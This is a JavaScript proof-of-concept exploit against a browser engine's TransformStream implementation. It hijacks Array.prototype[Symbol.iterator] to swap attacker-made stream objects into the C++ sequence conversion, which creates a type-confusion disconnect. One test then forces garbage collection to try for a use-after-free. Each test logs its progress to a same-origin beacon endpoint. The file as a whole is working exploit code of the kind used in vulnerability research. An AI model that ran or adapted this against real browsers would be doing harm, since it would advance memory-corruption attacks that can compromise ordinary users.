/*
 * p429 -- TransformStream iterator bypass: pass jsDynamicCast with real stream instances
 *
 * The C++ code (TransformStream.cpp:121-122) checks:
 *   jsDynamicCast<JSReadableStream*>(results[1])
 *   jsDynamicCast<JSWritableStream*>(results[2])
 *
 * Previous tests failed because we returned plain objects.
 * Fix: return actual ReadableStream/WritableStream instances.
 *
 * The iterator is invoked TWICE:
 *   1) Inside JS builtin: const [readable, writable] = @initializeTransformStream(...)
 *   2) In C++: SequenceConverter<IDLObject>::convert(globalObject, result.returnValue())
 *
 * Attack: on call 1, intercept the REAL streams. On call 2, substitute attacker streams.
 * This creates a disconnect between internal state and C++ wrapper.
 *
 * Beacon prefix: V429-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V429-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: Pass jsDynamicCast with real ReadableStream/WritableStream
// ================================================================

function testA() {
  B("A-START");

  if (typeof TransformStream === "undefined") {
    B("A-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var interceptedItems = [];

  try {
    // Create attacker-controlled streams that will pass jsDynamicCast
    var attackerReadable = new ReadableStream({
      start: function(ctrl) {
        B("A-ATK-READABLE-START");
      }
    });
    var attackerWritable = new WritableStream({
      write: function(chunk) {
        B("A-ATK-WRITABLE-WRITE", typeof chunk);
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;
      var len = arr.length;

      B("A-ITER-" + callNum, {len: len, types: []});

      // Log what the array actually contains
      var typeInfo = [];
      for (var k = 0; k < len && k < 5; k++) {
        typeInfo.push(typeof arr[k]);
      }
      B("A-ITER-" + callNum + "-TYPES", JSON.stringify(typeInfo));

      if (callNum === 1) {
        // First call: inside initializeTransformStream destructuring
        // The array should be [readable, writable] (2 elements)
        // Intercept the real streams
        return {
          next: function() {
            if (idx < len) {
              var val = arr[idx];
              interceptedItems.push(val);
              B("A-ITER1-ITEM-" + idx, {type: typeof val, ctor: val && val.constructor ? val.constructor.name : "?"});
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      if (callNum === 2) {
        // Second call: C++ SequenceConverter on return array [transform, readable, writable]
        // Return: [original transform, attacker readable, attacker writable]
        var fakeResults = [arr[0], attackerReadable, attackerWritable];
        var fi = 0;
        return {
          next: function() {
            if (fi < fakeResults.length) {
              var val = fakeResults[fi];
              B("A-ITER2-ITEM-" + fi, {type: typeof val, ctor: val && val.constructor ? val.constructor.name : "?"});
              fi++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      // Fallback: pass through
      return origIter.call(arr);
    };

    var ts = new TransformStream();
    B("A-CREATED", {type: typeof ts, hasReadable: !!ts.readable, hasWritable: !!ts.writable});

    // Check if ts.readable is the attacker's
    B("A-READABLE-IS-ATTACKER", ts.readable === attackerReadable);
    B("A-WRITABLE-IS-ATTACKER", ts.writable === attackerWritable);

    // Try to use the stream
    try {
      var writer = ts.writable.getWriter();
      writer.write("test-data");
      B("A-WRITE-OK");
      writer.close();
    } catch(e) {
      B("A-WRITE-ERR", e.message.slice(0, 80));
    }

  } catch(e) {
    B("A-ERR", e.message.slice(0, 100));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test B: Intercept internal streams, keep refs, substitute attacker's
// ================================================================

function testB() {
  B("B-START");

  if (typeof TransformStream === "undefined") {
    B("B-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var realReadable = null;
  var realWritable = null;
  var realTransform = null;

  try {
    var attackerReadable = new ReadableStream();
    var attackerWritable = new WritableStream();

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        // Intercept initializeTransformStream result [readable, writable]
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 0) realReadable = val;
              if (idx === 1) realWritable = val;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      if (callNum === 2) {
        // Intercept return array [transform, readable, writable]
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 0) realTransform = val;
              if (idx === 1) val = attackerReadable;  // substitute
              if (idx === 2) val = attackerWritable;  // substitute
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      return origIter.call(arr);
    };

    var ts = new TransformStream();
    B("B-CREATED");

    // Check what we captured
    B("B-REAL-READABLE", {type: typeof realReadable, ctor: realReadable ? realReadable.constructor.name : "null"});
    B("B-REAL-WRITABLE", {type: typeof realWritable, ctor: realWritable ? realWritable.constructor.name : "null"});
    B("B-REAL-TRANSFORM", {type: typeof realTransform});

    // ts.readable/writable should be attacker's
    B("B-READABLE-MATCH", ts.readable === attackerReadable);
    B("B-WRITABLE-MATCH", ts.writable === attackerWritable);

    // Now we have:
    // - ts: TransformStream with attacker's readable/writable
    // - realReadable/realWritable: the REAL internal streams
    // - realTransform: the internal state object (with private slots)

    // Write to REAL writable -- should go through the transform
    if (realWritable) {
      try {
        var realWriter = realWritable.getWriter();
        realWriter.write("via-real-writable");
        B("B-REAL-WRITE-OK");
      } catch(e) {
        B("B-REAL-WRITE-ERR", e.message.slice(0, 60));
      }
    }

    // Read from REAL readable -- should get transformed data
    if (realReadable) {
      try {
        var realReader = realReadable.getReader();
        realReader.read().then(function(res) {
          B("B-REAL-READ", {done: res.done, val: typeof res.value});
        }).catch(function(e) {
          B("B-REAL-READ-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("B-REAL-READER-ERR", e.message.slice(0, 60));
      }
    }

  } catch(e) {
    B("B-ERR", e.message.slice(0, 100));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test C: Type confusion via disconnect -- enqueue to real, read attacker's
// ================================================================

function testC() {
  B("C-START");

  if (typeof TransformStream === "undefined") {
    B("C-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var stolenReadable = null;

  try {
    // Create attacker writable that logs what it receives
    var receivedChunks = [];
    var attackerWritable = new WritableStream({
      write: function(chunk) {
        receivedChunks.push(chunk);
        B("C-ATK-GOT", {chunk: String(chunk).slice(0, 40), total: receivedChunks.length});
      }
    });

    // Attacker readable that we control
    var attackerReadableCtrl = null;
    var attackerReadable = new ReadableStream({
      start: function(ctrl) {
        attackerReadableCtrl = ctrl;
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum <= 1) {
        // Pass through for internal destructuring
        return origIter.call(arr);
      }

      if (callNum === 2) {
        // Substitute on the return array
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 1) {
                stolenReadable = val;
                val = attackerReadable;
              }
              if (idx === 2) val = attackerWritable;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      return origIter.call(arr);
    };

    var ts = new TransformStream({
      transform: function(chunk, controller) {
        // Double the chunk
        controller.enqueue(chunk);
        controller.enqueue(chunk);
      }
    });
    B("C-CREATED");

    // The real readable has the transformed data (doubled chunks)
    // The attacker readable is empty
    // ts.readable IS the attacker readable
    // ts.writable IS the attacker writable

    B("C-IS-ATTACKER-R", ts.readable === attackerReadable);
    B("C-IS-ATTACKER-W", ts.writable === attackerWritable);

    // Read from stolen (real) readable
    if (stolenReadable) {
      try {
        var realReader = stolenReadable.getReader();
        B("C-STOLEN-READER-OK");

        // Enqueue to attacker readable (which is ts.readable)
        if (attackerReadableCtrl) {
          attackerReadableCtrl.enqueue("from-attacker");
          B("C-ATK-ENQUEUE-OK");
        }

        realReader.read().then(function(res) {
          B("C-STOLEN-READ", {done: res.done, val: String(res.value).slice(0, 40)});
        }).catch(function(e) {
          B("C-STOLEN-READ-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("C-STOLEN-ERR", e.message.slice(0, 60));
      }
    }

  } catch(e) {
    B("C-ERR", e.message.slice(0, 100));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test D: GC the real streams, trigger UAF through controller
// ================================================================

function testD() {
  B("D-START");

  if (typeof TransformStream === "undefined") {
    B("D-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  try {
    var attackerReadable = new ReadableStream();
    var attackerWritable = new WritableStream();

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum <= 1) return origIter.call(arr);

      if (callNum === 2) {
        return {
          next: function() {
            if (idx < arr.length) {
              var val = arr[idx];
              if (idx === 1) val = attackerReadable;
              if (idx === 2) val = attackerWritable;
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }
      return origIter.call(arr);
    };

    var ts = new TransformStream();
    B("D-CREATED");

    Array.prototype[Symbol.iterator] = origIter;

    // GC pressure to try to collect the orphaned real streams
    for (var i = 0; i < 100; i++) {
      var t = new ArrayBuffer(1024 * 1024);
      t = null;
    }
    B("D-GC-DONE");

    // Now try to interact with ts -- internal controller references real streams
    // If real streams were GC'd, this should crash or produce weird behavior
    try {
      var w = ts.writable.getWriter();
      w.write("after-gc");
      B("D-WRITE-AFTER-GC-OK");

      var r = ts.readable.getReader();
      r.read().then(function(res) {
        B("D-READ-AFTER-GC", {done: res.done, type: typeof res.value});
      }).catch(function(e) {
        B("D-READ-AFTER-GC-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("D-INTERACT-ERR", e.message.slice(0, 80));
    }

  } catch(e) {
    B("D-ERR", e.message.slice(0, 100));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test E: Check if builtin uses iterator at all (control test)
// ================================================================

function testE() {
  B("E-START");

  if (typeof TransformStream === "undefined") {
    B("E-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];
  var callLog = [];

  try {
    Array.prototype[Symbol.iterator] = function() {
      var id = callLog.length;
      callLog.push({len: this.length, stack: new Error().stack.slice(0, 200)});
      B("E-ITER-" + id, {len: this.length});

      // Always pass through real values
      var arr = this;
      var idx = 0;
      return {
        next: function() {
          if (idx < arr.length) {
            return {value: arr[idx++], done: false};
          }
          return {done: true};
        }
      };
    };

    var ts = new TransformStream();
    B("E-CREATED", {iterCalls: callLog.length});

    // Log all iterator calls
    for (var i = 0; i < callLog.length && i < 5; i++) {
      B("E-CALL-" + i, {len: callLog[i].len, stack: callLog[i].stack.slice(0, 150)});
    }

  } catch(e) {
    B("E-ERR", e.message.slice(0, 100));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

testE();  // Control test first
testA();
testB();
testC();
testD();

setTimeout(function() { B("DONE"); }, 3000);
})();
